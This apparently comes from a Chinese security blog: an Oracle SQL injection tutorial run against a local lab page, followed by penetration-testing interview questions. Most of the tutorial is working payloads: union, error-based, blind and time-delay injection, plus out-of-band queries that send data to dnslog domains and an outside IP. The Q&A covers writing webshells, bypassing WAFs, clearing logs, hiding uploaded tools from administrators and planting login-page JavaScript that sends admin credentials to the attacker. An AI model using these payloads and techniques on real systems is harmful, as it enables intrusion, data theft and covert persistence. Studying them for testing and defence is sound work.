sys.v_$version where rownum=1),null from dual–’ 判断列数1http://127.0.0.1/oracle.php?id=IT_PROG' order by 6-- 报错，则为5列 联合注入1http://127.0.0.1/oracle.php?id=IT_PROG' union select null,null,null,null,null from dual-- 判断每个字段的数据类型1http://127.0.0.1/oracle.php?id=IT_PROG' union select 1,null,null,'4',null from dual-- 如下图：判断为第一列int型，第四列char型 报错如下，则为前后的数据类型不匹配： 1Warning: oci_fetch_row(): ORA-24374: define not done before fetch or execute and fetch in D:\\phpStudy_x64_8.0.1\\WWW\\oracle.php on line 27 存疑：DATA类型如何转换？如何注入？ 判断当前数据库的用户payload:select SYS_CONTEXT('USERENV','CURRENT_USER') from dual 1http://127.0.0.1/oracle.php?id=IT_PROG' union select 1,null,null,(select SYS_CONTEXT('USERENV','CURRENT_USER') from dual),null from dual-- 判断当前数据库的版本1http://127.0.0.1/oracle.php?id=IT_PROG' union select 1,null,null,(select banner from sys.v_$version where rownum=1),null from dual-- 暴破数据库名payload：select owner from all_tables where rownum=1 1http://127.0.0.1/oracle.php?id=IT_PROG' union select 1,null,null,(select owner from all_tables where rownum=1),null from dual-- 为SYS 判断下一个数据库 关键payload： owner &lt;&gt;'SYS' 1http://127.0.0.1/oracle.php?id=IT_PROG' union select 1,null,null,(select owner from all_tables where rownum=1 and owner &lt;&gt;'SYS'),null from dual-- 为：OUTLN 判断下下个数据库 关键payload：and owner &lt;&gt;'SYS' and owner &lt;&gt;'OUTLN' 1http://127.0.0.1/oracle.php?id=IT_PROG' union select 1,null,null,(select owner from all_tables where rownum=1 and owner &lt;&gt;'SYS' and owner &lt;&gt;'OUTLN'),null from dual-- 得到的数据库有：SYS、OUTLN、SYSTEM 后续可以不断的去暴破，直到暴破所有的数据库名为止（报错即为没有下一个数据库了）。 注意：表一定要大写。 当前用户的表的获取payload：select table_name from user_tables where rownum=1 （select table_name from all_tables 查看所有表） 得到表名LOGMNR_SESSION_EVOLVE$ 同样使用 and table_name &lt;&gt;'LOGMNR_SESSION_EVOLVE$'遍历所有的表名 同时注意此处得到的表名有可能重复，加上distinct去重 即：select distinct table_name from user_tables where rownum=1 and table_name &lt;&gt; 'LOGMNR_SESSION_EVOLVE$' 获取字段名payload:select column_name from user_tab_columns where table_name='XXX' and rownum=1 获取第一列： 1http://127.0.0.1/oracle.php?id=IT_PROG' union select 1,null,null,(select column_name from user_tab_columns where table_name='LOGMNR_SESSION_EVOLVE$' and rownum=1),null from dual-- 得到第一列：BRANCH_LEVEL 获取第二列： 1http://127.0.0.1/oracle.php?id=IT_PROG' union select 1,null,null,(select column_name from user_tab_columns where table_name='LOGMNR_SESSION_EVOLVE$' and rownum=1 and column_name&lt;&gt;'BRANCH_LEVEL'),null from dual-- 得到第二列：SESSION# 暴数据 以hr库中的COUNTER表为例 1http://127.0.0.1/oracle.php?id=IT_PROG' union select 1,null,null,(select CONCAT(COUNTRY_ID,COUNTRY_NAME) from hr.COUNTRIES where rownum=1),null from dual-- select CONCAT(COUNTRY_ID,COUNTRY_NAME,REGION_ID) from hr.COUNTRIES会报错，因为REGION_ID为int类型 oracle的字符连接用||符号，或者用concat，但是concat只能连接字符串(可以嵌套实现连接多个字符串)，输出不友好，所以我这里用||符号连接输出的字符串 1http://127.0.0.1/oracle.php?id=IT_PROG' union select 1,null,null,(select COUNTRY_ID||'~'||COUNTRY_NAME||'~'||REGION_ID from hr.COUNTRIES where rownum=1),null from dual-- 报错注入判断注入点payload：select count(*) from user_tables 1http://127.0.0.1/oracle.php?id=IT_PROG' and (select count (*) from user_tables)&gt;0 -- &gt;0可以正常执行，&lt;0执行异常，则存在注入点 报错函数utl_inaddr.get_host_name( )获取ip 地址,其参数如果解析不了会报错，显示传递的参数。如果其参数是一个SQL语句，那么报错就会把结果给显示出来。 payload：1=utl_inaddr.get_host_name(select user from dual) 添加几个飘号容易识别 1http://127.0.0.1/oracle.php?id=IT_PROG' and 1=utl_inaddr.get_host_name((select '~'||user||'~' from dual))-- ctxsys.drithsx.sn()：11=ctxsys.drithsx.sn(1,(select user from dual)) 该函数在查询关于主题的对应关键词时，会报错显示出第二个参数的结果 XMLType():1and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null -- dbms_xdb_version.checkin()1and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null-- bms_xdb_version.makeversioned()1and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null -- dbms_xdb_version.uncheckout()1and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null -- dbms_utility.sqlid_to_sqlhash()1and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null -- ordsys.ord_dicom.getmappingxpath()1and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)-- decode()1and 1=(select decode(substr(user,1,1),'S',(1/0),0) from dual) -- 注意：decode()不会显示报错信息，需要通过页面来判断。当substr(user,1,1)=‘S’页面报错，其他情况页面无报错也不会显示数据。类似盲注。 decode(条件,值1,返回值1,值2,返回值2,…值n,返回值n,缺省值) 意思是：当条件等于值1时就得到返回值1~~~~ eg： 12http://127.0.0.1/oracle.php?id=IT_PROG' and 1=(select decode(substr(user,1,1),'A',(1/0),0) from dual) --http://127.0.0.1/oracle.php?id=IT_PROG' and 1=(select decode(substr(user,1,1),'B',(1/0),0) from dual) -- 上述测试结果为页面正常，不显示任何数据，也不报错。 显示如下的结果，说明当前用户的首字母是S，代码decode(substr(user,1,1),’S’,(1/0),0)中 substr(user,1,1)=’S’时，就返回(1/0)的值，但是0不能为分母，所以报错！ 其他的暴数据库、表、字段的过程和之前一致。 布尔盲注在Oracle布尔盲注实验中，可以是普通猜解的方法也可以使用某些函数来辅助猜解，如前面提到的decode函数，以及instr函数等。接下来我们测试普通猜解方法、decode方法和instr方法。 普通猜解方法（substr+ascii）获取当前用户下的数据表长度payload：SELECT LENGTH(table_name) from user_tables where rownum=1 1http://127.0.0.1/oracle.php?id=IT_PROG' and 19=(SELECT LENGTH(table_name) from all_tables where rownum=1)-- 页面正常显示，判断当前的用户下表长度为19 获取数据表名的每个字符猜测数据库表的每个字符，使用字符截取函数substr和ascii函数 1http://127.0.0.1/oracle.php?id=IT_PROG' and 68=((select ascii(substr(table_name,1,1)) from all_tables WHERE rownum=1))-- substr(string, start,length) 只有页面正常显示才能推出每个字符的ASCII码。当前数据表的首字母的ASCII是65，也即A，同理依次遍历得到数据表名。 获取数据表的字段长度以HR.COUNTRIES表为例， payload：select LENGTH(column_name) from user_tab_columns where table_name=’XXX’ and rownum=1 1http://127.0.0.1/oracle.php?id=IT_PROG' and 10=(select LENGTH(COLUMN_NAME) from all_tab_columns where table_name='COUNTRIES' and rownum=1)-- 没有报错，显示正常，说明长度为10 获取数据表下的字段名的每个字符payload：select ascii(substr(column_name,1,1)) from all_tab_columns where table_name=’XXX’ and rownum=1 1http://127.0.0.1/oracle.php?id=IT_PROG' and 67=(select ascii(substr(column_name,1,1)) from all_tab_columns where table_name='COUNTRIES' and rownum=1)-- 页面显示正常，则说明第一个字符为C，这个过程也可以用burp去暴破 ASCII码范围：0~127 获取字段长度payload：select length(CONCAT(COUNTRY_ID,COUNTRY_NAME)) from XXX where rownum=1 1http://127.0.0.1/oracle.php?id=IT_PROG' and 11=(select length(CONCAT(COUNTRY_ID,COUNTRY_NAME)) from hr.COUNTRIES where rownum=1)-- 获取字段内容的每个字符payload：select CONCAT(COUNTRY_ID,COUNTRY_NAME) from XXX where rownum=1 1http://127.0.0.1/oracle.php?id=IT_PROG' and 65=(select ascii(substr(CONCAT(COUNTRY_ID,COUNTRY_NAME),1,1)) from hr.COUNTRIES where rownum=1)-- 逐个遍历即可得到完整字段内容。 注：1、有时候直接使用substr也可以进行注入，加入burp遍历更方便，不用依次转换ascii码的值。被过滤时，再考虑使用ascii转换 1http://127.0.0.1/oracle.php?id=IT_PROG' and 'A'=(select substr(CONCAT(COUNTRY_ID,COUNTRY_NAME),1,1) from hr.COUNTRIES where rownum=1)-- 2、布尔盲注：先猜长度，再猜字段。 DECODE函数方式Decode的使用方法：decode(字段或字段的运算，值1，值2，值3） ​ 这个函数运行的结果是，当字段或字段的运算的值等于值1时，该函数返回值2，否则返回值3 当然值1，值2，值3也可以是表达式 判断当前用户名长度select decode(length(user),4,1,0) from dual 1http://127.0.0.1/oracle.php?id=IT_PROG' and 1=(select decode(length(user),6,1,0) from dual)-- 显示正常，说明用户长度为6 获取当前用户名内容的每个字符select decode(substr(user,1,1),’S’,1,0) from dual 1http://127.0.0.1/oracle.php?id=IT_PROG' and 1=(select decode(substr(user,1,1),'S',1,0) from dual)-- 逐个遍历即可得到完整字段内容。 暴破表、字段内容的方法同上。 INSTR函数函数instr的使用方法：instr(string1,string2)，在string1中找到string2所在的位置，找到返回其索引。 eg：SELECT INSTR(‘substr’, ‘str’) from dual; select instr((select user from dual),’TEST’) from dual; –返回值是1 说明用户中有TEST字符串 select instr((select length(user) from dual),4) from dual;– 返回值是1 说明用户的长度是4 select instr((select length(table_name) from user_tables where rownum=1),4) from dual; –返回值是1 说明当前用户的第一个表的名称长度是4 该如何判断名称每个字符呢？ select instr(substr((select table_name from user_tables where rownum=1),1,1),’D’) from dual; –返回值是1 书名表名的第一个字符是D，后续可以通过BP去暴破。 延时盲注在Oracle延时注入利用过程中需要使用DECODE、DBMS_PIPE.RECEIVE_MESSAGE等函数来延时数据库的处理时间，最后测试者可以通过网页的加载时间来判断注入结果。 DECODE函数的使用方法此处不再讨论。 DBMS_PIPE.RECEIVE_MESSAGE(‘RDS’,5)表示从RDS管道返回的数据需要等待5秒，一般情况下可以以PUBLIC权限使用该函数。 payload：and 1= dbms_pipe.receive_message(‘RDS’, 5)– 1http://127.0.0.1/oracle.php?id=IT_PROG' and 1= dbms_pipe.receive_message('RDS', 5)-- 可以看到页面网络加载时间是5S，可以看到注入效果。注意该函数的返回值是1 后续步骤需要使用DECODE函数。 DECODE(condition,value,dbms_pipe.receive_message(‘RDS’, 5),0)，意思是当condition=value就返回dbms_pipe.receive_message(‘RDS’, 5)，那么页面就等待5秒时间，从而达到延时注入的目的。 payload：select decode(substr(user,1,1),’T’,dbms_pipe.receive_message(‘RDS’,5),0) from dual 1http://127.0.0.1/oracle.php?id=IT_PROG' and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('RDS',5),0) from dual)-- 得到用户名SYSTEM 还有其他方式延时注入，如select count(*) from all_objects，大量统计操作很耗时，可以辅助延时注入，但是延长时间不好控制。 带外注入方法一：utl_http.request()select utl_http.request(“www.baidu.com&quot;) from dual; eg： 1select utl_http.request((select user from dual)||'.ljc08k.dnslog.cn') from dual; 方法二：utl_inaddr.get_host_address()select utl_inaddr.get_host_address(‘www.baidu.com') from dual; 1select utl_inaddr.get_host_address((select user from dual)||'.m8146s.dnslog.cn') from dual; 方法三：DBMS_LDAP.INIT()select SYS.DBMS_LDAP.INIT((select user from dual)||’.aaaa.com’,80) from dual 注意第二个参数不能丢，否则报错如下： 1ORA-06553: PLS-306: wrong number or types of arguments in call to 'INIT' eg: 1SELECT DBMS_LDAP.INIT('uka9e0.dnslog.cn',80) FROM DUAL; 1select DBMS_LDAP.INIT((select user from dual)||'.uka9e0.dnslog.cn',80) from dual 检测方法utl_http.request()payload: 1and utl_http.request('http://115.29.184.87:2333/'||(SELECT user FROM dual))=1 -- 基本上每次都要60秒才回显到web，但是发送请求的那一刻，服务器就会收到消息。 web视图如下： 1http://127.0.0.1/oracle.php?id=IT_PROG' and utl_http.request('http://115.29.184.87:2333/'||(SELECT user FROM dual))=1 --' utl_inaddr.get_host_address()payload: 1and utl_inaddr.get_host_address((select user from dual)||'.29qo74.dnslog.cn')='1' -- web视图： DBMS_LDAP.INIT()payload: 1and DBMS_LDAP.INIT((select user from dual)||'.113bm3.dnslog.cn',80)='1'-- web视图： 1http://127.0.0.1/oracle.php?id=IT_PROG' and DBMS_LDAP.INIT((select user from dual)||'.113bm3.dnslog.cn',80)='1'-- 报错未解决如下：有可能是数据库没有这几个函数 1Warning: oci_execute(): ORA-00920: invalid relational operator Oracle注入防御1、代码层防御技术 使用参数化查询语句、验证输入、规范化等技术，如JAVA中使用JDBC框架，C#使用ADO.NAT框架，PHP使用PDO架构等。Oracle PL/SQL 在数据库代码层也可以使用参数化方式去查询，它使用带有编号的冒号字符去绑定参数来达到防注入的目的[5][6]。 2、输入验证 任何输入的数据均是不可信的，可以对不可信数据进行验证，如使用黑白名单过滤等。在JAVA中可以使用定义一个输入验证类，实现javax.faces.validator.Validator接口，对用户输入进行验证。C#可以使用某些具有验证功能的控件对用户输入进行验证。PHP中可以使用正则表达式验证用户输入，或者使用特定功能函数判断输入是否合法。 3、输出编码 https://cloud.tencent.com/developer/article/1672145 https://xz.aliyun.com/t/7897 https://www.tr0y.wang/2019/04/16/Oracle%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/index.html","link":"/2021/01/02/Oracle%E6%B3%A8%E5%85%A5/"},{"title":"渗透测试面试题基础版2019","text":"知识大纲 思路流程 信息收集 漏洞挖掘 漏洞利用&amp;权限提升 清除测试数据&amp;输出报告 复测 问题 深信服一面: SQL注入防护 为什么参数化查询可以防止sql注入 SQL头注入点 盲注是什么？怎么盲注？ 宽字节注入产生原理以及根本原因 产生原理 在哪里编码 根本原因 解决办法 sql里面只有update怎么利用 sql如何写shell/单引号被过滤怎么办 代替空格的方法 mysql的网站注入，5.0以上和5.0以下有什么区别？ XSS 反射型 储存型 DOM型 XSS原理 DOM型和反射型的区别 DOM型XSS 自动化测试或人工测试 如何快速发现xss位置 对于XSS怎么修补建议 XSS蠕虫的产生条件 CSRF CSRF原理 防御 token和referer做横向对比，谁安全等级高？ 对referer的验证，从什么角度去做？如果做，怎么杜绝问题 针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？ SSRF 检测 SSRF漏洞的成因 防御 绕过 上传 文件上传漏洞原理 常见的上传绕过方式 防护 审查上传点的元素有什么意义？ 文件包含 原理 导致文件包含的函数 本地文件包含 XXE 逻辑漏洞 金融行业常见逻辑漏洞 溢出 中间人攻击 原理: 防护 ARP欺骗 DDOS syn洪流的原理 CC攻击原理 Ddos原理 DDOS防护 提权 Mysql_UDF提权 Mysql mof提权 mysql两种提权方式 特殊漏洞 原理 利用 漏洞加固 防护 产生原因 利用条件和方法 修复 Struts2-045 Redis未授权访问 Jenkins未授权访问 MongoDB未授权访问 Memcache未授权访问 FFMPEG 本地文件读取漏洞 安全知识 简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。 wireshark简单的过滤规则 TCP三次握手的过程以及对应的状态转换 TCP和UDP协议区别 https的建立过程 AES／DES的具体工作步骤 RSA算法 分组密码的加密模式 如何生成一个安全的随机数？ SSL握手过程 对称加密与非对称加密的不同，分别用在哪些方面 如何清理日志 入侵 Linux 服务器后需要清除哪些日志？ LINUX Windows 查看当前端口连接的命令有哪些？netstat 和 ss 命令的区别和优缺点 反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么? 通过Linux系统的/proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？ linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。 如何一条命令查看文件内容最后一百行 如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。 各种数据库文件存放的位置 php中命令执行涉及到的函数 安全模式下绕过php的disable fuction PHP弱类型 常用WEB开发JAVA框架 同源策略 Jsonp安全攻防技术，怎么写Jsonp的攻击页面？ 涉及到Jsonp的安全攻防内容 攻击页面 WEB PHP 数据库 系统 密码学 TCP/IP 流量分析 防火墙 思路流程信息收集 服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等） 网站指纹识别（包括，cms，cdn，证书等），dns记录 whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等） 子域名收集，旁站，C段等 google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等 扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等 传输协议，通用漏洞，exp，github源码等 漏洞挖掘 浏览网站，看看网站规模，功能，特点等 端口，弱口令，目录等扫描,对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。 XSS，SQL注入，上传，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等 漏洞利用&amp;权限提升 mysql提权，serv-u提权，oracle提权 windows 溢出提权 linux脏牛,内核漏洞提权e 清除测试数据&amp;输出报告i 日志、测试数据的清理 ii 总结，输出渗透测试报告，附修复方案 复测验证并发现是否有新漏洞，输出报告，归档 问题1.拿到一个待检测的站，你觉得应该先做什么？ 信息收集 获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。用邮箱做关键词丢进搜索引擎。利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。社工找出社交账号，里面或许会找出管理员设置密码的习惯 。利用已有信息生成专用字典。 查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。 查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞 查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。 扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针 google hack 进一步探测网站的信息，后台，敏感文件 漏洞扫描 开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含， 远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等 漏洞利用 利用以上的方式拿到webshell，或者其他权限 权限提升 提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权 日志清理 总结报告及修复方案 2.判断出网站的CMS对渗透有什么意义？ 查找网上已曝光的程序漏洞。 如果开源，还能下载相对应的源码进行代码审计。 3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？ 敏感文件、二级目录扫描 站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点 4.常见的网站服务器容器。 IIS、Apache、nginx、Lighttpd、Tomcat 5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？ root权限以及网站的绝对路径。 6.目前已知哪些版本的容器有解析漏洞，具体举例。 IIS 6.0 /xx.asp/xx.jpg “xx.asp”是文件夹名 IIS 7.0/7.5 默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析 Nginx 版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。 空字节代码 xxx.jpg.php Apache 上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后 lighttpd xx.jpg/xx.php，不全,请小伙伴们在评论处不吝补充，谢谢！ 7.如何手工快速判断目标站是windows还是linux服务器？ linux大小写敏感,windows大小写不敏感。 ifconfig、ipconfig 使用ping的方式,ttl=32为windos 9x/Me，ttl=64为linux，ttl=128为windows 200x/xp，ttl=255为unix 当然了这个值也可以被修改，并不准确。 8.为何一个mysql数据库的站，只有一个80端口开放？ 更改了端口，没有扫描出来。 站库分离。 3306端口不对外开放 9、3389无法连接的几种情况 没开放3389 端口 端口被修改 防护拦截 处于内网(需进行端口转发) 10.如何突破注入时字符被转义？ 宽字符注入 hex编码绕过 11.在某后台新闻编辑界面看到编辑器，应该先做什么？ 查看编辑器的名称版本,然后搜索公开的漏洞。 12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？ 能做的事情很多，用隐藏网马来举例子： 插入 &lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php .jpg文件会被解析成.php文件。 具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。 13.注入漏洞只能查账号密码？ 只要权限广，拖库脱到老。 14.安全狗会追踪变量，从而发现出是一句话木马吗？ 是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。 15.access 扫出后缀为asp的数据库文件，访问乱码，如何实现到本地利用？ 迅雷下载，直接改后缀为.mdb。 16.提权时选择可读写目录，为何尽量不用带空格的目录？ 因为exp执行多半需要空格界定参数 17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？ 同数据库。 18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？ and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。 19.某个防注入系统，在注入时会提示： 系统检测到你有非法注入的行为。已记录您的ip xx.xx.xx.xx 时间:2016:01-23 提交页面:test.asp?id=15 提交内容:and 1=1 如何利用这个防注入系统拿shell？ 在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。 21.上传大马后访问乱码时，有哪些解决办法？ 浏览器中改编码。 重新传一个大马，指定为UTF-8编码或GBK编码 22.审查上传点的元素有什么意义？ 有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。 23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？ 先爆破用户名，再利用被爆破出来的用户名爆破密码。 所有和数据库有交互的地方都有可能有注入，尝试SQL注入。 尝试POST型的XSS。 24.目标站发现某txt的下载地址为http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？ 这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。 25.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？ 直接在网站二级目录/abc/下扫描敏感文件及目录。 26.在有shell的情况下，如何使用xss实现对目标站的长久控制？ 后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。 在登录后才可以访问的文件中插入XSS脚本。 27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？ 审查元素 把密码处的password属性改成text就明文显示了 28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？ 原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过 29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？ 在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到内容。 30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？ 隐藏文件夹，为了不让管理员发现你传上去的工具。 31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由： ​ A. demo.jsp?id=2+1 ​ B. demo.jsp?id=2-1 选B，在 URL 编码中 + 代表空格，可能会造成混淆 32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？ demo.do?DATA=AjAxNg== DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试 33、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？ 有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell 使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高。通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell 34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？ XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。 CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。 35、CSRF、SSRF和重放攻击有什么区别？ CSRF是跨站请求伪造攻击，由客户端发起 SSRF是服务器端请求伪造，由服务器发起 重放攻击是将截获的数据包进行重放，达到身份认证等目的 36、说出至少三种业务逻辑漏洞，以及修复方式？ 密码找回漏洞中存在 1）密码允许暴力破解、 2）存在通用型找回凭证、 3）可以跳过验证步骤、 4）找回凭证可以拦包获取等方式来通过厂商提供的密码找回功能来得到密码。 身份认证漏洞中最常见的是 1）会话固定攻击 2） Cookie 仿冒 只要得到 Session 或 Cookie 即可伪造用户身份。 验证码漏洞中存在 1）验证码允许暴力破解 2）验证码可以通过 Javascript 或者改包的方法来进行绕过 37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？ get /ecskins/demo.jsp?uid=2016031900&amp;keyword=”hello world” HTTP/1.1Host:.com:82User-Agent:Mozilla/ 5.0 Firefox/40Accept:text/css,/;q=0.1 Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3 Referer:http://****.com/eciop/orderForCC/ cgtListForCC.htm?zone=11370601&amp;v=145902 Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d; uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ; st_uid=N90PLYHLZGJXI-NX01VPUF46W; status=True Connection:keep-alive 38、给你一个网站你是如何来渗透测试的? 在获取书面授权的前提下。 39、sqlmap，怎么对一个注入点注入？ 1）如果是get型号，直接，sqlmap -u “诸如点网址”. 如果是post型诸如点，可以sqlmap -u “注入点网址” –data=”post的参数” 3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r “文件地址” 40、nmap，扫描的几种方式 41、sql注入的几种类型？ 1）报错注入 2）bool型注入 3）延时注入 4）宽字节注入 42、报错注入的函数有哪些？ ​ 10个 ​ 1）and extractvalue(1, concat(0x7e,(select @@version),0x7e)) ​ 2）通过floor报错向下取整 ​ 3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1) ​ 4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)b)); ​ 5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b)); ​ 6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b)); ​ 7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b)); ​ 8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b)); ​ 9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b)); ​ 10）.exp()select from test where id=1 and exp(~(select * from(select user())a)); 43、延时注入如何来判断？ if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1) 44、盲注和延时注入的共同点？ 都是一个字符一个字符的判断 45、如何拿一个网站的webshell？ 上传，后台编辑模板，sql注入写文件，命令执行，代码执行， 一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等 46、sql注入写文件都有哪些函数？ select ‘一句话’ into outfile ‘路径’ select ‘一句话’ into dumpfile ‘路径’ select ‘’ into dumpfile ‘d:\\wwwroot\\baidu.com\\nvhack.php’; 47、如何防止CSRF? 1.验证referer 2.验证token 详细：http://cnodejs.org/topic/5533dd6e9138f09b629674fd 48、owasp 漏洞都有哪些？ 1、SQL注入防护方法： 2、失效的身份认证和会话管理 3、跨站脚本攻击XSS 4、直接引用不安全的对象 5、安全配置错误 6、敏感信息泄露 7、缺少功能级的访问控制 8、跨站请求伪造CSRF 9、使用含有已知漏洞的组件 10、未验证的重定向和转发 49、SQL注入防护方法？ 1、使用安全的API 2、对输入的特殊字符进行Escape转义处理 3、使用白名单来规范化输入验证方法 4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符 5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。 50、代码执行，文件读取，命令执行的函数都有哪些？ 1）代码执行：eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function 2）文件读取： file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(),fgets(),parse_ini_file(),show_source(),file()等 3)命令执行： system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open() 51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？ src指定一个远程的脚本文件，获取referer 52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。 1）远程服务器修改apache配置文件，配置.jpg文件以php方式来解析 AddType application/x-httpd-php .jpg &lt;img src=http://xss.tv/1.jpg&gt; 会以php方式来解析 53、为什么aspx木马权限比asp大？ aspx使用的是.net技术。IIS 中默认不支持，ASP只是脚本语言而已。入侵的时候asp的木马一般是guest权限…APSX的木马一般是users权限。 54、如何绕过waf？ 大小写转换法 定界符 /*!*/ 编码 base64 unicode hex url ascll 复参数 55、如何向服务器写入webshell？ 各种上传漏洞 mysql具有写入权限,用sql语句写入shell http put方法 56、渗透测试中常见的端口 1,web类(web漏洞/敏感目录) 第三方通用组件漏洞struts thinkphp jboss ganglia zabbix 12380 web80-89 web8000-9090 web 2,数据库类(扫描弱口令) 12341433 MSSQL1521 Oracle3306 MySQL5432 PostgreSQL 3,特殊服务类(未授权/命令执行类/漏洞) 12345678910443 SSL心脏滴血873 Rsync未授权5984 CouchDB http://xxx:5984/_utils/6379 redis未授权7001,7002 WebLogic默认弱口令，反序列9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞11211 memcache未授权访问27017,27018 